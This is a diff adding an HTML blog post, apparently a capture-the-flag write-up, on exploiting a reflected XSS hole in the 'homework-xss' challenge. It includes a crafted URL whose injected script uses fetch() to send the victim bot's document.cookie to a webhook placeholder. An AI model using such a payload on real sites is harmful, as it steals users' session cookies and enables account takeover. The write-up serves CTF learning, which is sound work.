@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Contents</title>
+    <link rel="stylesheet" href="../../styles.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/default.min.css">
+  </head>
+  <body id="postBody">
+
+    <header id="postHeader">
+      Simple Reflected XSS 
+    </header>
+    <div id="publishDate">Date Published: 11/22/2024<hr></div>
+    
+    <div class="postParagraph">
+      <h2>Writeup: web/homework-xss</h2>
+      <p>
+      An attack through a reflected XSS vulnerability is employed 
+      through social engineering: the victim would have to click 
+      a url supplied by the attacker.
+      <br><br>
+      The site, <a href="https://homework-xss.acmcyber.com/" 
+      target="_blank"> homework-xss.acmcyber.com</a>, is 
+      vulnerable to reflected XSS. If the field is filled with 
+      simple html javascript <code style="background-color: 
+      rgba(0, 0, 0, 0.103); color: rgb(80, 80, 80)">
+      &lt;script&gt; alert(1) &lt;/script&gt; </code>
+      a popup is triggered when submitted. The idea is to get
+      the flag which is usually stored as a cookie on the victims
+      browser. 
+      <br>
+      <img src="../../images/xss1.png" style="width:75%;">
+      <br>
+      <img src="../../images/xss2.png" style="width:75%;">
+      <br>
+      The <a href="https://admin-bot.acmcyber.com/homework-xss"
+      target="_blank">Admin Bot</a> acts as a victim that visits 
+      the webpage. Using this Bot, we want to send a manipulated URL
+      with the reflected XSS that allows us to access the bot's
+      cookie. This can be done using the fetch API and <a href=
+      "https://webhook.site" target="_blank">Webhook</a> which allows
+      you to view requests to a provided URL. The following malicious
+      url uses a javascript template literal to insert the bot's 
+      cookie into the url parameter of the webhook url when the bot
+      visits the url.
+      <pre>
+        <code class="language-plaintext" style="background-color: rgba(0, 0, 0, 0.103);">
+https://homework-xss.acmcyber.com/hw?submission=
+&lt;script&gt;fetch(`[WEBHOOK_SITE_URL]/?q=${document.cookie}`)&lt;/script&gt;
+        </code>
+      </pre>
+      <img src="../../images/xss3.png" style="width:95%;">
+      <br><br><br>
+      This cookie is then viewable through webhook as value of the "q" query parameter.
+      <img src="../../images/xss4.png" style="width:95%;">
+    </div>
+    <br>
+    <footer>
+    </footer>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/go.min.js"></script>
+    <script>hljs.highlightAll();</script>
+    <script src="../../postScripts.js">
+    </script>
+  </body>
+</html>
